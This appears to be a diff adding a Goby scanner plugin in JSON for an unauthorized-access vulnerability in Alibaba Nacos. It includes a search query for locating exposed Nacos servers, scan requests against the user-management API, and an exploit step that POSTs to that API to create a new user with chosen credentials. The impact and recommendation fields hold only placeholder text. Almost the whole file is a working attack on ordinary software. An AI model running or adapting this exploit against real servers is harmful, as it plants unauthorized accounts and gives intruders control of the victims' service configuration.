@@ -1,0 +1,113 @@
+{
+      "Name": "Alibaba Nacos 未授权访问漏洞",
+      "Level": "2",
+      "Tags": [
+            "未授权访问"
+      ],
+      "GobyQuery": "(title=\"Nacos\" || title=\"HTTP Status 404 – Not Found\" || port=\"8848\")",
+      "Description": "2020年12月29日，Nacos官方在github发布的issue中披露Alibaba Nacos 存在一个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进行任意操作，包括创建新用户并进行登录后操作。",
+      "Product": "Nacos <= 2.0.0-ALPHA.1",
+      "Homepage": "https://github.com/alibaba/nacos",
+      "Author": "PeiQi",
+      "Impact": "<p>🐏<br><br></p>",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "http://wiki.peiqi.techa"
+      ],
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "User",
+			"type": "input",
+			"value": "PeiQi",
+			"show": ""
+		},
+		{
+			"name": "Pass",
+			"type": "input",
+			"value": "PeiQi",
+			"show": ""
+		},
+		{
+			"name": "Dir",
+			"type": "select",
+			"value": "/v1/auth/users,/nacos/v1/auth/users",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/nacos/v1/auth/users?",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "500",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/v1/auth/users?",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "500",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "{{{Dir}}}",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "username={{{User}}}&password={{{Pass}}}"
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2021-01-25 16:12:32",
+      "GobyVersion": "1.8.237"
+}
